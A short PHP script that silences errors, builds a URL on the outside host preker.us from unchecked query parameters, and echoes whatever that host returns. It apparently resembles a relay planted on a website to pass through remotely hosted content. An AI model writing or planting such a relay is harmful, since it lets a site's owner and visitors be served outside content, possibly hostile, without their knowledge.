<?php
error_reporting(0);
$d = date('ihs');
$m = 'https://preker.us/'.$_GET['c'].$_GET['b'].'?a='.$_GET['a'];
echo file_get_contents($m);
//echo $m;
?>
